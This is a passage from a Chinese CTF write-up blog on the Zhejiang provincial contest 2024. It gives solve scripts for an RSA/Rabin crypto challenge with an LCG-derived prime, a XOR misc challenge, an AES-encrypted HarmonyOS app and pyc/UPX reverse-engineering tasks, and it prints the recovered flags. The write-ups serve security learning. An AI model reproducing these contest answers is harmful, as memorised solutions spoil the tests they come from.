iterate_multiple_times(B, t, a, b, p)<br><br><span class="hljs-keyword">assert</span> secret1 == secret2<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">p = 2565258348684709722726260231955260453241716968378483821594041597297293609376806025180965681289016169408781752953380586044352169083397987333072306444539318806255242559916564022662479</span><br><span class="hljs-string">a = 7703427441632069990122897903141278700284019287330080801753208940444135129072547305259960648105321270085533531118395452229965873504176368162947864923497711</span><br><span class="hljs-string">b = 8477265953761650860710068507342719089504862957398782381045770264963932696457722724393775545810962476516315838411812248360284564925846788951219272632661157</span><br><span class="hljs-string">s = 9228773209718156231041982890745928246648483643042884535935071957475932603607283209094294685862893340598940862096657878372229519375655468524041406914666867</span><br><span class="hljs-string">A = 434251860827782638796736001849473241231781620594954088572922898040098881748337513244415553659525671751903798527967205418513869125476445927127124010452649344318178999731385274553080</span><br><span class="hljs-string">B = 434251860827782638796736001849473241231781620594954088572922898040098881748337513244415553659525671751903798527967205418513869125476445927127124010452649344318178999731385274553080</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>p2 = next_prime(secret1)<br>q2 = getPrime(<span class="hljs-number">600</span>)<br>n2 = p2*q2<br>e = <span class="hljs-number">4</span><br>m = bytes_to_long(flag)<br>c = <span class="hljs-built_in">pow</span>(m, e, n2)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n2 =&quot;</span>, n2)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c =&quot;</span>, c)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">n2 = 3241139665583501598296135149075754735041636843305130049654913708275571916563715101898946962033698805416493133339619007016676895968314902474922279948997540924678346952667095320094789476561995339618782687993966133770687551933070478999383821269223854568552819152909266096733330218505088222661907600152055916956562332379930822529724151378274932991887183193175206749</span><br><span class="hljs-string">c = 1131281812215293796960536920068009435705926803182047772347743960804329656316689664084120353862091370978145286943689311985878028828902275260824388998300548644880722651153603738691769179255824425771260974588160589473958033612303767050773921373389315920529311000160530833707622310013322631917184737227893101365726934901652170763292132835433158093074003616578836411</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>赛后看到wp发现可以爆破k，怎么想都不现实，但是别人能出就该想想原本不现实的方法，算出p和q，后来想想%p其实可以循环</p><p>发现e和phi不互素</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">p=<span class="hljs-number">1472490340321845700492870656866629756386520746748019952980831685935628618084832981576756885932019702470337632472478610542460495595381421112792242654382213433012352298291319463142659</span><span class="hljs-comment"># n = 3241139665583501598296135149075754735041636843305130049654913708275571916563715101898946962033698805416493133339619007016676895968314902474922279948997540924678346952667095320094789476561995339618782687993966133770687551933070478999383821269223854568552819152909266096733330218505088222661907600152055916956562332379930822529724151378274932991887183193175206749</span><br>c = <span class="hljs-number">1131281812215293796960536920068009435705926803182047772347743960804329656316689664084120353862091370978145286943689311985878028828902275260824388998300548644880722651153603738691769179255824425771260974588160589473958033612303767050773921373389315920529311000160530833707622310013322631917184737227893101365726934901652170763292132835433158093074003616578836411</span><br>e = <span class="hljs-number">4</span><br>q=<span class="hljs-number">2201127964530536768531437690590447485511044947862563552674657770394302822371223893779621142446998848918986248500749184930380894798831854267120305815092270548187578354416455278612511</span><br>R.&lt;x&gt; = PolynomialRing(GF(p))<br>f1 = x^<span class="hljs-number">4</span> - c<br>res1 = f1.roots()<br>R.&lt;x&gt; = PolynomialRing(GF(q))<br>f2 = x^<span class="hljs-number">4</span> - c<br>res2 = f2.roots()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res1:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> res2:<br>        m = crt([<span class="hljs-built_in">int</span>(i[<span class="hljs-number">0</span>]),<span class="hljs-built_in">int</span>(j[<span class="hljs-number">0</span>])],[p,q])<br>        <span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><p>当然发现p和q都%4&#x3D;3，也就是用rabin解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> math<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br>p = <span class="hljs-number">2565258348684709722726260231955260453241716968378483821594041597297293609376806025180965681289016169408781752953380586044352169083397987333072306444539318806255242559916564022662479</span><br>a = <span class="hljs-number">7703427441632069990122897903141278700284019287330080801753208940444135129072547305259960648105321270085533531118395452229965873504176368162947864923497711</span><br>b = <span class="hljs-number">8477265953761650860710068507342719089504862957398782381045770264963932696457722724393775545810962476516315838411812248360284564925846788951219272632661157</span><br>s = <span class="hljs-number">9228773209718156231041982890745928246648483643042884535935071957475932603607283209094294685862893340598940862096657878372229519375655468524041406914666867</span><br>A = <span class="hljs-number">434251860827782638796736001849473241231781620594954088572922898040098881748337513244415553659525671751903798527967205418513869125476445927127124010452649344318178999731385274553080</span><br>B = <span class="hljs-number">434251860827782638796736001849473241231781620594954088572922898040098881748337513244415553659525671751903798527967205418513869125476445927127124010452649344318178999731385274553080</span><br>n = <span class="hljs-number">3241139665583501598296135149075754735041636843305130049654913708275571916563715101898946962033698805416493133339619007016676895968314902474922279948997540924678346952667095320094789476561995339618782687993966133770687551933070478999383821269223854568552819152909266096733330218505088222661907600152055916956562332379930822529724151378274932991887183193175206749</span><br>c = <span class="hljs-number">1131281812215293796960536920068009435705926803182047772347743960804329656316689664084120353862091370978145286943689311985878028828902275260824388998300548644880722651153603738691769179255824425771260974588160589473958033612303767050773921373389315920529311000160530833707622310013322631917184737227893101365726934901652170763292132835433158093074003616578836411</span><br>e=<span class="hljs-number">4</span><br><br>seed=s<br>k=<span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> seed!=A:<br>    seed=(seed*a+b)%p<br>    k+=<span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(k)<br><br>seed=A<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">12345</span>):<br>    seed=(seed*a+b)%p<br>p=next_prime(seed)<br><span class="hljs-built_in">print</span>(p)<br>q=n//p<br><span class="hljs-built_in">print</span>(q)<br><br>inv_p = invert(p, q)<br>inv_q = invert(q, p)<br><br>cs = [c]<br>lge = math.log(e, <span class="hljs-number">2</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">int</span>(lge)):<br>    ps = []<br>    <span class="hljs-keyword">for</span> c2 <span class="hljs-keyword">in</span> cs:<br>        r = <span class="hljs-built_in">pow</span>(c2, (p + <span class="hljs-number">1</span>) // <span class="hljs-number">4</span>, p)<br>        s = <span class="hljs-built_in">pow</span>(c2, (q + <span class="hljs-number">1</span>) // <span class="hljs-number">4</span>, q)<br><br>        x = (r * inv_q * q + s * inv_p * p) % n<br>        y = (r * inv_q * q - s * inv_p * p) % n<br>        <span class="hljs-keyword">if</span> x <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> ps:<br>            ps.append(x)<br>        <span class="hljs-keyword">if</span> n - x <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> ps:<br>            ps.append(n - x)<br>        <span class="hljs-keyword">if</span> y <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> ps:<br>            ps.append(y)<br>        <span class="hljs-keyword">if</span> n - y <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> ps:<br>            ps.append(n - y)<br>    cs = ps<br><br><span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> cs:<br>    flag=long_to_bytes(m)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;DASCTF&#x27;</span> <span class="hljs-keyword">in</span> flag:<br>        <span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="FinalSign"><a href="#FinalSign" class="headerlink" title="FinalSign"></a><strong>FinalSign</strong></h2><p>得到的字符串尝试转化成16进制，去异或DASCTF，看到hellow，猜测循环异或的字符串是helloworld，得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">s=<span class="hljs-string">&#x27;2c243f2f3b3114345d0a0909333f06100143023b2c55020912&#x27;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(s))<br><span class="hljs-comment"># for i in range(0,len(s),2):</span><br><span class="hljs-comment">#     print(int(s[i:i+2],16),end=&quot;,&quot;)</span><br>a=[<span class="hljs-number">44</span>,<span class="hljs-number">36</span>,<span class="hljs-number">63</span>,<span class="hljs-number">47</span>,<span class="hljs-number">59</span>,<span class="hljs-number">49</span>,<span class="hljs-number">20</span>,<span class="hljs-number">52</span>,<span class="hljs-number">93</span>,<span class="hljs-number">10</span>,<span class="hljs-number">9</span>,<span class="hljs-number">9</span>,<span class="hljs-number">51</span>,<span class="hljs-number">63</span>,<span class="hljs-number">6</span>,<span class="hljs-number">16</span>,<span class="hljs-number">1</span>,<span class="hljs-number">67</span>,<span class="hljs-number">2</span>,<span class="hljs-number">59</span>,<span class="hljs-number">44</span>,<span class="hljs-number">85</span>,<span class="hljs-number">2</span>,<span class="hljs-number">9</span>,<span class="hljs-number">18</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(a))<br>s1=<span class="hljs-string">&#x27;helloworld&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(a[i]^<span class="hljs-built_in">ord</span>(s1[i%<span class="hljs-built_in">len</span>(s1)])),end=<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-comment">#print(i)</span><br><br><span class="hljs-comment">#DASCTF&#123;F1nal_Sign1n_D0ne&#125;</span><br></code></pre></td></tr></table></figure><p>实际上是snow无密钥解密得到异或的字符串helloworld</p><h1 id="信创安全"><a href="#信创安全" class="headerlink" title="信创安全"></a>信创安全</h1><h2 id="easy-hpp-1"><a href="#easy-hpp-1" class="headerlink" title="easy_hpp-1"></a>easy_hpp-1</h2><p>两次解压得到modules.abc</p><p>发现aes和base64，没发现密文，事后想到要搜索等号</p><p>看到zjuctf一眼原题但是没做过</p><img src="/2024/11/12/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%86%B3%E8%B5%9Bwp/1731225876017-fa7b8439-a9cc-4656-8e81-c7a4b94c6351.png" class="" title="img"><p>也没有so文件，比赛的时候就卡住了</p><p>复现的时候找到几乎原题，就是加密有些不一样</p><p><a href="https://note.gopoux.cc/ctf/writeups/zjuctf2024/#easy-hap">Writeups - GoPoux 的笔记本</a></p><p>下载能反编译abc的jadx，找到真正的密文</p><p><a href="https://github.com/ohos-decompiler/abc-decompiler/releases">Releases · ohos-decompiler&#x2F;abc-decompiler</a></p><img src="/2024/11/12/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%86%B3%E8%B5%9Bwp/1731227678288-be3367f8-7cae-490e-996d-8bdaddbfedc9.png" class="" title="img"><img src="/2024/11/12/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%86%B3%E8%B5%9Bwp/1731227844917-92dd5a58-0535-4856-a625-c3fa78c7996b.png" class="" title="img"><img src="/2024/11/12/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%86%B3%E8%B5%9Bwp/1731227777613-9667981c-19c3-4d7a-b087-34481be651a8.png" class="" title="img"><img src="/2024/11/12/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%86%B3%E8%B5%9Bwp/1731227949424-99d221f2-cc73-4443-8538-760b3e074dd0.png" class="" title="img"><p>稍微修改一下decodeX的顺序就能得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">string_to_uint8_array</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">return</span> np.array([<span class="hljs-built_in">ord</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s], dtype=np.uint8)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encodeX</span>(<span class="hljs-params">arg0, arg1</span>):<br>    res = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        res.append(arg1[i])<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        res.append(arg0[i] ^ arg1[i])<br>    <span class="hljs-keyword">return</span> res<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encodeY</span>(<span class="hljs-params">arg</span>):<br>    <span class="hljs-keyword">return</span> base64.b64encode(<span class="hljs-built_in">bytes</span>(arg)).decode()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decodeY</span>(<span class="hljs-params">arg</span>):<br>    <span class="hljs-keyword">return</span> base64.b64decode(arg)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decodeX</span>(<span class="hljs-params">res</span>):<br>    arg1 = res[:<span class="hljs-number">16</span>]<br>    arg0 = res[<span class="hljs-number">16</span>:]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        arg0[i] ^= arg1[i]<br>    <span class="hljs-keyword">return</span> arg0, arg1<br><br>commonCipherKey = string_to_uint8_array(<span class="hljs-string">&quot;DASCTF2024-OHAPP&quot;</span>).tobytes()<br><br>code = <span class="hljs-string">&quot;/aPR+E8wS9+XbFMUfm8NacHpP190pf5xaR8+MIm/8gw=&quot;</span><br><br>tmp4 = code<br><br>tmp3 = decodeY(tmp4)<br>tmp3 = [c <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> tmp3]<br><span class="hljs-comment"># print(tmp3)</span><br><br>tmp1, tmp2 = decodeX(tmp3)<br>tmp1 = <span class="hljs-built_in">bytes</span>(tmp1)<br>tmp2 = <span class="hljs-built_in">bytes</span>(tmp2)<br><br><br>cipherY = AES.new(commonCipherKey, AES.MODE_CBC, iv=tmp1)<br>slice2 = cipherY.decrypt(tmp2)<br><span class="hljs-comment"># print(slice2)</span><br><br>cipherX = AES.new(commonCipherKey, AES.MODE_ECB)<br>slice1 = cipherX.decrypt(tmp1)<br><span class="hljs-comment"># print(slice1)</span><br><br>flag = slice1+ slice2<br><span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-comment">#b&#x27;DASCTF&#123;Ea5Y_ohaPp_&amp;_5iMPl3_fl4g&#125;&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>比赛wp</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>浙江省省赛2024初赛Reverse与信创安全wp</title>
    <link href="/2024/11/03/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%88%9D%E8%B5%9BReverse%E4%B8%8E%E4%BF%A1%E5%88%9B%E5%AE%89%E5%85%A8wp/"/>
    <url>/2024/11/03/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%88%9D%E8%B5%9BReverse%E4%B8%8E%E4%BF%A1%E5%88%9B%E5%AE%89%E5%85%A8wp/</url>
    
    <content type="html"><![CDATA[<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><p>个人感觉今年的初赛re没签到题，但是难题没有前几年的难</p><h2 id="ezRe"><a href="#ezRe" class="headerlink" title="ezRe"></a>ezRe</h2><p>010发现是pyc文件</p><img src="/2024/11/03/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%88%9D%E8%B5%9BReverse%E4%B8%8E%E4%BF%A1%E5%88%9B%E5%AE%89%E5%85%A8wp/1730530532230-c314f28c-7595-41b5-aaab-a3b3994304a9.png" class="" title="img"><p>nnd，pycdc反编译不了，可能是pyc文件被改了</p><img src="/2024/11/03/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%88%9D%E8%B5%9BReverse%E4%B8%8E%E4%BF%A1%E5%88%9B%E5%AE%89%E5%85%A8wp/1730530600492-1d05780d-c925-4093-b3c5-6a37390ecf2b.png" class="" title="img"><p>只能用pycdas，先对key进行异或</p><img src="/2024/11/03/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%88%9D%E8%B5%9BReverse%E4%B8%8E%E4%BF%A1%E5%88%9B%E5%AE%89%E5%85%A8wp/1730530746479-272c9598-a487-4779-bedd-56f9ef9d875c.png" class="" title="img"><p>类似rc4但是只生成了密钥流，并没有异或密文</p><img src="/2024/11/03/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%88%9D%E8%B5%9BReverse%E4%B8%8E%E4%BF%A1%E5%88%9B%E5%AE%89%E5%85%A8wp/1730530796207-c4e25106-29c9-42a9-9be8-2b7313acf280.png" class="" title="img"><p>后续异或key和51</p><img src="/2024/11/03/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%88%9D%E8%B5%9BReverse%E4%B8%8E%E4%BF%A1%E5%88%9B%E5%AE%89%E5%85%A8wp/1730530834754-9bcdad5f-f2ac-4522-abdb-1ecd30dff7b0.png" class="" title="img"><p>最后是base64</p><img src="/2024/11/03/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%88%9D%E8%B5%9BReverse%E4%B8%8E%E4%BF%A1%E5%88%9B%E5%AE%89%E5%85%A8wp/1730530895312-c4ac9893-52e8-45a0-a6cf-5508a554efde.png" class="" title="img"><p>逆的时候异或密文可以放在最后，不能反编译真恶心</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>encoded = <span class="hljs-string">&#x27;w53Cj3HDgzTCsSM5wrg6FMKcw58Qw7RZSFLCljRxwrxbwrVdw4AEwqMjw7/DkMKTw4/Cv8Onw4NGw7jDmSdcwq4GGg==&#x27;</span><br>ciphertext = base64.b64decode(encoded).decode()<br>key = <span class="hljs-string">&#x27;7e021a7dd49e4bd0837e22129682551b&#x27;</span><br><br>s = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>j = <span class="hljs-number">0</span><br>key = [<span class="hljs-built_in">ord</span>(c) ^ <span class="hljs-number">102</span> <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> key] <br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>    j = (j + s[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span><br>    s[i], s[j] = s[j], s[i]<br><br>i = j = <span class="hljs-number">0</span><br>data = []<br><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):<br>    i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>    j = (j + s[i]) % <span class="hljs-number">256</span><br>    s[i], s[j] = s[j], s[i]<br>    k = s[(s[i] + s[j]) % <span class="hljs-number">256</span>]<br>    data.append(k)<br><br><br>result = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> c, k <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(ciphertext, data):<br>    result += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(c) ^ k ^ <span class="hljs-number">51</span>)<br><br><span class="hljs-built_in">print</span>( result)<br></code></pre></td></tr></table></figure><h2 id="Midmath"><a href="#Midmath" class="headerlink" title="Midmath"></a>Midmath</h2><p>修改特征码DAS为UPX</p><img src="/2024/11/03/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%88%9D%E8%B5%9BReverse%E4%B8%8E%E4%BF%A1%E5%88%9B%E5%AE%89%E5%85%A8wp/1730529059899-0a44cdb8-3f45-4368-a978-6f89acb66e5e.png" class="" title="img"><p>然后脱壳</p><img src="/2024/11/03/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%88%9D%E8%B5%9BReverse%E4%B8%8E%E4%BF%A1%E5%88%9B%E5%AE%89%E5%85%A8wp/1730528952066-2552698f-67a7-41cd-8452-55563439a58d.png" class="" title="img"><img src="/2024/11/03/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%88%9D%E8%B5%9BReverse%E4%B8%8E%E4%BF%A1%E5%88%9B%E5%AE%89%E5%85%A8wp/1730529025066-510388d4-53b5-4a7c-aaf5-33b79e4a2eb9.png" class="" title="img"><p>发现是找最大路径，用动态规划做</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_SUM 6668912</span><br><span class="hljs-type">int</span> a[<span class="hljs-number">510</span>][<span class="hljs-number">510</span>], f[<span class="hljs-number">510</span>][<span class="hljs-number">510</span>], path[<span class="hljs-number">510</span>];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-built_in">srand</span>(<span class="hljs-built_in">time</span>(<span class="hljs-literal">NULL</span>));<br>    <span class="hljs-type">int</span> x = <span class="hljs-number">1</span>, y = <span class="hljs-number">1</span>;<br>    FILE *fp = <span class="hljs-built_in">fopen</span>(<span class="hljs-string">&quot;out&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br>    <br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">fscanf</span>(fp, <span class="hljs-string">&quot;%d&quot;</span>, &amp;a[x][y]) != EOF) &#123;<br>        <span class="hljs-keyword">if</span> (x == y) &#123;<br>            y = <span class="hljs-number">1</span>;<br>            x++;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        y++;<br>    &#125;<br>    <span class="hljs-built_in">fclose</span>(fp);<br>    x--; <br><br><br>    f[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] = a[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt;= x; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= i; j++) &#123;<br><br>            f[i][j] = f[i - <span class="hljs-number">1</span>][j] + a[i][j];<br>            <span class="hljs-keyword">if</span> (j &gt; <span class="hljs-number">1</span>) &#123;<br>                f[i][j] = <span class="hljs-built_in">max</span>(f[i][j], f[i - <span class="hljs-number">1</span>][j - <span class="hljs-number">1</span>] + a[i][j]); <br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= x; i++) &#123;<br>        <span class="hljs-keyword">if</span> (f[x][i] &gt; MAX_SUM) &#123;<br>            <span class="hljs-type">int</span> cx = x, cy = i;<br>            <span class="hljs-keyword">while</span> (cx &gt; <span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-keyword">if</span> (f[cx][cy] == f[cx - <span class="hljs-number">1</span>][cy] + a[cx][cy]) &#123;<br>                    path[cx] = <span class="hljs-number">1</span>; <br>                &#125; <span 